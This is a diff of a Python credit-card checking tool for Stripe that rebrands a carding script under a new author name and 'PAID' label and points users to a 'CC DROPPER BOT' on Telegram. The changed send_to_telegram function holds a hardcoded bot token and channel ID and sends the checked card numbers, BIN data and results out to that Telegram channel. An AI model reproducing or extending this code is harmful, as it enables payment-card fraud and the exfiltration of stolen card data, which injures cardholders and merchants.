@@ -23,17 +23,16 @@ L=Fore.BLUE
 
 #----------LOGO-------------#
 logo = ("""
-\033[38;2;173;216;230m ########  ########     ###     ######    #######  ##    ## 
-\033[38;2;255;160;122m ##     ## ##     ##   ## ##   ##    ##  ##     ## ###   ## 
-\033[38;2;144;238;144m ##     ## ##     ##  ##   ##  ##        ##     ## ####  ## 
-\033[38;2;255;69;0m ##     ## ########  ##     ## ##   #### ##     ## ## ## ## 𝙇
-\033[38;2;30;144;255m ##     ## ##   ##   ######### ##    ##  ##     ## ##  #### 𝙊
-\033[38;2;238;130;238m ##     ## ##    ##  ##     ## ##    ##  ##     ## ##   ### 𝙍
-\033[38;2;255;215;0m ########  ##     ## ##     ##  ######    #######  ##    ## 𝘿\033[1;93m
+\033[38;2;255;69;0m                       __             __   _ ____
+  ___  ____ ___  ____  / /___  _______/ /__(_) / /
+ / _ \/ __ `__ \/ __ \/ __/ / / / ___/ //_/ / / / 
+/  __/ / / / / / /_/ / /_/ /_/ (__  ) ,< / / / /  
+\___/_/ /_/ /_/ .___/\__/\__, /____/_/|_/_/_/_/   
+             /_/        /____/             \033[1;93m
 \x1b[1;95m┏───────────────────────────────────────────────┓
-\x1b[1;94m \x1b[1;97m [\x1b[1;92m+\x1b[1;97m]  \x1b[1;96m 𝘈𝘜𝘛𝘏𝘖𝘙     \x1b[1;97m: \033[38;2;72;209;204mNIGHT STALKER
-\x1b[1;95m \x1b[1;97m [\x1b[1;92m+\x1b[1;97m]  \x1b[1;96m 𝘛𝘠𝘗𝘌       \x1b[1;97m: \033[38;2;255;69;0mNull🔥
-\x1b[1;95m \x1b[1;97m [\x1b[1;92m+\x1b[1;97m]  \x1b[1;96m 𝘎𝘐𝘛𝘏𝘜𝘉     \x1b[1;97m: \033[38;2;147;112;219mNIGHT-STALKER-666
+\x1b[1;94m \x1b[1;97m [\x1b[1;92m+\x1b[1;97m]  \x1b[1;96m 𝘈𝘜𝘛𝘏𝘖𝘙     \x1b[1;97m: \033[38;2;72;209;204mEmptySkill
+\x1b[1;95m \x1b[1;97m [\x1b[1;92m+\x1b[1;97m]  \x1b[1;96m 𝘛𝘠𝘗𝘌       \x1b[1;97m: \033[38;2;255;69;0mPAID🔥
+\x1b[1;95m \x1b[1;97m [\x1b[1;92m+\x1b[1;97m]  \x1b[1;96m 𝘎𝘐𝘛𝘏𝘜𝘉     \x1b[1;97m: \033[38;2;147;112;219memptyskill
 \x1b[1;95m \x1b[1;97m [\x1b[1;92m+\x1b[1;97m]  \x1b[1;96m 𝘛𝘖𝘖𝘓       \x1b[1;97m: \033[38;2;0;206;209mSTRIPE CC CHECKER
 \x1b[1;95m \x1b[1;97m [\x1b[1;92m+\x1b[1;97m]  \x1b[1;96m 𝘝𝘌𝘙𝘚𝘐𝘖𝘕    \x1b[1;97m: \033[38;2;255;105;180m1.0
 \x1b[1;91m \x1b[1;46m\033[1;91m ✅ NOT JUST A STRIPE CHECKER\033[;0m\033[1;91m\033[1;92m
@@ -106,9 +105,9 @@ def get_telegram_username(user_id, bot_token):
         return f"User ID: {user_id}"
 
 def send_to_telegram(ccx, result, bin_code, elapsed_time, user_id):
-    bot_token = "7814941492:AAFdOLY604OvdbptJBh6KFgvUkGkx-h3UHg"
+    bot_token = "7844307981:AAFqCTbxeNJ6CBglaRc2SazU3CmcBbr9DIw"
     channel_id = "-1002317552901"
-    user_idi = "1344144034"
+    user_idi = "6041675516"
     bin_result = bin_lookup(bin_code)
     username = get_telegram_username(user_id, bot_token)
     message = f"""
@@ -224,9 +223,9 @@ def multi_checking(cc_info, user_id):
 
 def main():
     clear()
-    typewriter("GO TO B3 DROPPER BOT AND CLICK ON START. ELSE WAIT, CODE WILL REDIRECT YOU 🤝", speed=0.05)
+    typewriter("GO TO EMPTYSKILL CC DROPPER BOT AND CLICK ON START. ELSE WAIT, CODE WILL REDIRECT YOU 🤝", speed=0.05)
     time.sleep(5)
-    os.system('xdg-open https://t.me/b3ccdrop_bot')
+    os.system('xdg-open https://t.me/emptyskillbot')
     clear()
 
     user_id = input(Fore.YELLOW + "Please enter your Telegram user ID: " + Fore.RESET)
